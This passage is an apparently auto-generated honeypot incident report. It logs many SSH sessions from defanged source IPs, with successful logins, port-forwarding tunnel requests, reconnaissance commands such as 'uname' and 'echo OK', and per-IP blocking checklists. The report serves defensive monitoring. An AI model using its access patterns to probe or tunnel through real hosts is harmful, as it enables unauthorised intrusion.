- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c5892a3e64

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 10:58 |
| **Last Seen** | 2026-07-09 10:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:58:32` | `cowrie.session.connect` |
| `2026-07-09 10:58:34` | `cowrie.client.version` |
| `2026-07-09 10:58:34` | `cowrie.client.kex` |
| `2026-07-09 10:58:40` | `cowrie.login.success` |
| `2026-07-09 10:58:44` | `cowrie.session.params` |
| `2026-07-09 10:58:44` | `cowrie.command.input` |
| `2026-07-09 10:58:45` | `cowrie.log.closed` |
| `2026-07-09 10:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d9b03b6d25

| Field | Detail |
|---|---|
| **Source IP** | `90.173.78[.]90` |
| **First Seen** | 2026-07-09 11:00 |
| **Last Seen** | 2026-07-09 11:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:00:52` | `cowrie.session.connect` |
| `2026-07-09 11:00:53` | `cowrie.client.version` |
| `2026-07-09 11:00:53` | `cowrie.client.kex` |
| `2026-07-09 11:00:55` | `cowrie.login.success` |
| `2026-07-09 11:00:55` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.173.78[.]90` to AbuseIPDB if not already reported
- [ ] Block `90.173.78[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b4dc23103a

| Field | Detail |
|---|---|
| **Source IP** | `211.252.94[.]151` |
| **First Seen** | 2026-07-09 11:01 |
| **Last Seen** | 2026-07-09 11:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:01:07` | `cowrie.session.connect` |
| `2026-07-09 11:01:07` | `cowrie.client.version` |
| `2026-07-09 11:01:07` | `cowrie.client.kex` |
| `2026-07-09 11:01:10` | `cowrie.login.success` |
| `2026-07-09 11:01:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.252.94[.]151` to AbuseIPDB if not already reported
- [ ] Block `211.252.94[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2781c9e52be2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 11:09 |
| **Last Seen** | 2026-07-09 11:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:09:13` | `cowrie.session.connect` |
| `2026-07-09 11:09:14` | `cowrie.client.version` |
| `2026-07-09 11:09:14` | `cowrie.client.kex` |
| `2026-07-09 11:09:18` | `cowrie.login.success` |
| `2026-07-09 11:09:22` | `cowrie.session.params` |
| `2026-07-09 11:09:22` | `cowrie.command.input` |
| `2026-07-09 11:09:23` | `cowrie.log.closed` |
| `2026-07-09 11:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310f0cf6498e

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-07-09 11:10 |
| **Last Seen** | 2026-07-09 11:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:10:20` | `cowrie.session.connect` |
| `2026-07-09 11:10:21` | `cowrie.client.version` |
| `2026-07-09 11:10:21` | `cowrie.client.kex` |
| `2026-07-09 11:10:24` | `cowrie.login.success` |
| `2026-07-09 11:10:24` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495d7f1694d7

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-09 11:12 |
| **Last Seen** | 2026-07-09 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:12:09` | `cowrie.session.connect` |
| `2026-07-09 11:12:10` | `cowrie.client.version` |
| `2026-07-09 11:12:10` | `cowrie.client.kex` |
| `2026-07-09 11:12:11` | `cowrie.login.success` |
| `2026-07-09 11:12:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7559ff0453

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-07-09 11:13 |
| **Last Seen** | 2026-07-09 11:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:13:49` | `cowrie.session.connect` |
| `2026-07-09 11:13:50` | `cowrie.client.version` |
| `2026-07-09 11:13:50` | `cowrie.client.kex` |
| `2026-07-09 11:13:52` | `cowrie.login.success` |
| `2026-07-09 11:13:52` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea12c6dc67da

| Field | Detail |
|---|---|
| **Source IP** | `190.117.96[.]174` |
| **First Seen** | 2026-07-09 11:15 |
| **Last Seen** | 2026-07-09 11:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:15:39` | `cowrie.session.connect` |
| `2026-07-09 11:15:40` | `cowrie.client.version` |
| `2026-07-09 11:15:40` | `cowrie.client.kex` |
| `2026-07-09 11:15:41` | `cowrie.login.success` |
| `2026-07-09 11:15:42` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.117.96[.]174` to AbuseIPDB if not already reported
- [ ] Block `190.117.96[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a8b0c5c0e2

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-09 11:15 |
| **Last Seen** | 2026-07-09 11:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:15:52` | `cowrie.session.connect` |
| `2026-07-09 11:15:53` | `cowrie.client.version` |
| `2026-07-09 11:15:53` | `cowrie.client.kex` |
| `2026-07-09 11:15:55` | `cowrie.login.success` |
| `2026-07-09 11:15:56` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b3da1d211a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 11:17 |
| **Last Seen** | 2026-07-09 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:17:02` | `cowrie.session.connect` |
| `2026-07-09 11:17:02` | `cowrie.client.version` |
| `2026-07-09 11:17:03` | `cowrie.client.kex` |
| `2026-07-09 11:17:03` | `cowrie.login.success` |
| `2026-07-09 11:17:04` | `cowrie.session.params` |
| `2026-07-09 11:17:04` | `cowrie.command.input` |
| `2026-07-09 11:17:04` | `cowrie.log.closed` |
| `2026-07-09 11:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4cc2027fd59

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-07-09 11:17 |
| **Last Seen** | 2026-07-09 11:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:17:23` | `cowrie.session.connect` |
| `2026-07-09 11:17:24` | `cowrie.client.version` |
| `2026-07-09 11:17:24` | `cowrie.client.kex` |
| `2026-07-09 11:17:26` | `cowrie.login.success` |
| `2026-07-09 11:17:26` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929a3e11af25

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-09 11:17 |
| **Last Seen** | 2026-07-09 11:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:17:31` | `cowrie.session.connect` |
| `2026-07-09 11:17:32` | `cowrie.client.version` |
| `2026-07-09 11:17:32` | `cowrie.client.kex` |
| `2026-07-09 11:17:34` | `cowrie.login.success` |
| `2026-07-09 11:17:35` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4bed88ead20

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 11:20 |
| **Last Seen** | 2026-07-09 11:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:20:03` | `cowrie.session.connect` |
| `2026-07-09 11:20:05` | `cowrie.client.version` |
| `2026-07-09 11:20:05` | `cowrie.client.kex` |
| `2026-07-09 11:20:11` | `cowrie.login.success` |
| `2026-07-09 11:20:15` | `cowrie.session.params` |
| `2026-07-09 11:20:15` | `cowrie.command.input` |
| `2026-07-09 11:20:16` | `cowrie.log.closed` |
| `2026-07-09 11:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c6313b7d66

| Field | Detail |
|---|---|
| **Source IP** | `200.126.105[.]149` |
| **First Seen** | 2026-07-09 11:26 |
| **Last Seen** | 2026-07-09 11:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:26:09` | `cowrie.session.connect` |
| `2026-07-09 11:26:10` | `cowrie.client.version` |
| `2026-07-09 11:26:10` | `cowrie.client.kex` |
| `2026-07-09 11:26:13` | `cowrie.login.success` |
| `2026-07-09 11:26:14` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.126.105[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.126.105[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031f06e7bb08

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-07-09 11:26 |
| **Last Seen** | 2026-07-09 11:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:26:27` | `cowrie.session.connect` |
| `2026-07-09 11:26:28` | `cowrie.client.version` |
| `2026-07-09 11:26:28` | `cowrie.client.kex` |
| `2026-07-09 11:26:30` | `cowrie.login.success` |
| `2026-07-09 11:26:31` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934315d10f48

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 11:27 |
| **Last Seen** | 2026-07-09 11:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:27:39` | `cowrie.session.connect` |
| `2026-07-09 11:27:39` | `cowrie.client.version` |
| `2026-07-09 11:27:40` | `cowrie.client.kex` |
| `2026-07-09 11:27:40` | `cowrie.login.success` |
| `2026-07-09 11:27:41` | `cowrie.session.params` |
| `2026-07-09 11:27:41` | `cowrie.command.input` |
| `2026-07-09 11:27:41` | `cowrie.log.closed` |
| `2026-07-09 11:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b2eca74c42

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-09 11:30 |
| **Last Seen** | 2026-07-09 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:30:10` | `cowrie.session.connect` |
| `2026-07-09 11:30:10` | `cowrie.client.version` |
| `2026-07-09 11:30:10` | `cowrie.client.kex` |
| `2026-07-09 11:30:10` | `cowrie.login.success` |
| `2026-07-09 11:30:11` | `cowrie.session.params` |
| `2026-07-09 11:30:11` | `cowrie.command.input` |
| `2026-07-09 11:30:11` | `cowrie.log.closed` |
| `2026-07-09 11:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f4b4a745bc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 11:30 |
| **Last Seen** | 2026-07-09 11:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:30:45` | `cowrie.session.connect` |
| `2026-07-09 11:30:47` | `cowrie.client.version` |
| `2026-07-09 11:30:47` | `cowrie.client.kex` |
| `2026-07-09 11:30:52` | `cowrie.login.success` |
| `2026-07-09 11:30:56` | `cowrie.session.params` |
| `2026-07-09 11:30:56` | `cowrie.command.input` |
| `2026-07-09 11:30:57` | `cowrie.log.closed` |
| `2026-07-09 11:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879e75227a11

| Field | Detail |
|---|---|
| **Source IP** | `132.243.24[.]82` |
| **First Seen** | 2026-07-09 11:31 |
| **Last Seen** | 2026-07-09 11:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:31:20` | `cowrie.session.connect` |
| `2026-07-09 11:31:20` | `cowrie.client.version` |
| `2026-07-09 11:31:20` | `cowrie.client.kex` |
| `2026-07-09 11:31:21` | `cowrie.login.success` |
| `2026-07-09 11:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `132.243.24[.]82` to AbuseIPDB if not already reported
- [ ] Block `132.243.24[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8f09dba333

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-09 11:31 |
| **Last Seen** | 2026-07-09 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:31:21` | `cowrie.session.connect` |
| `2026-07-09 11:31:21` | `cowrie.client.version` |
| `2026-07-09 11:31:21` | `cowrie.client.kex` |
| `2026-07-09 11:31:22` | `cowrie.login.success` |
| `2026-07-09 11:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3d9cbb2d89

| Field | Detail |
|---|---|
| **Source IP** | `27.154.225[.]118` |
| **First Seen** | 2026-07-09 11:31 |
| **Last Seen** | 2026-07-09 11:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:31:27` | `cowrie.session.connect` |
| `2026-07-09 11:31:28` | `cowrie.client.version` |
| `2026-07-09 11:31:28` | `cowrie.client.kex` |
| `2026-07-09 11:31:29` | `cowrie.login.success` |
| `2026-07-09 11:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.154.225[.]118` to AbuseIPDB if not already reported
- [ ] Block `27.154.225[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c430e06ad97

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-09 11:31 |
| **Last Seen** | 2026-07-09 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:31:30` | `cowrie.session.connect` |
| `2026-07-09 11:31:30` | `cowrie.client.version` |
| `2026-07-09 11:31:30` | `cowrie.client.kex` |
| `2026-07-09 11:31:30` | `cowrie.login.success` |
| `2026-07-09 11:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e12d03ef493

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-09 11:35 |
| **Last Seen** | 2026-07-09 11:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:35:58` | `cowrie.session.connect` |
| `2026-07-09 11:35:59` | `cowrie.client.version` |
| `2026-07-09 11:35:59` | `cowrie.client.kex` |
| `2026-07-09 11:36:00` | `cowrie.login.success` |
| `2026-07-09 11:36:00` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de90227845a

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-07-09 11:39 |
| **Last Seen** | 2026-07-09 11:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:39:35` | `cowrie.session.connect` |
| `2026-07-09 11:39:36` | `cowrie.client.version` |
| `2026-07-09 11:39:36` | `cowrie.client.kex` |
| `2026-07-09 11:39:37` | `cowrie.login.success` |
| `2026-07-09 11:39:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525db40bd5e6

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-09 11:39 |
| **Last Seen** | 2026-07-09 11:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:39:47` | `cowrie.session.connect` |
| `2026-07-09 11:39:48` | `cowrie.client.version` |
| `2026-07-09 11:39:48` | `cowrie.client.kex` |
| `2026-07-09 11:39:49` | `cowrie.login.success` |
| `2026-07-09 11:39:50` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986612e6786a

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-09 11:41 |
| **Last Seen** | 2026-07-09 11:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 11:41:08` | `cowrie.session.connect` |
| `2026-07-09 11:41:09` | `cowrie.client.version` |
| `2026-07-09 11:41:09` | `cowrie.client.kex` |
| `2026-07-09 11:41:10` | `cowrie.login.success` |
| `2026-07-09 11:41:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 11:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eafb9791e10

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 11:41 |
| **Last Seen** | 2026-07-09 11:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
